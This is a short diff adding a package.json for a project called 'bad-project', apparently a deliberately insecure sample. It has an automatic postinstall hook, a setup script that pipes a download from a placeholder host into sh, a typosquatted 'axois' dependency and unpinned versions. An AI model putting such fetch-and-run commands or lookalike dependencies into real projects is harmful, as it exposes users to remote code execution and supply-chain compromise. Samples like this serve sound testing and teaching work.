@@ -1,0 +1,12 @@
+{
+  "name": "bad-project",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node install.js",
+    "setup": "curl https://example.invalid/install.sh | sh"
+  },
+  "dependencies": {
+    "axois": "latest",
+    "express": "*"
+  }
+}
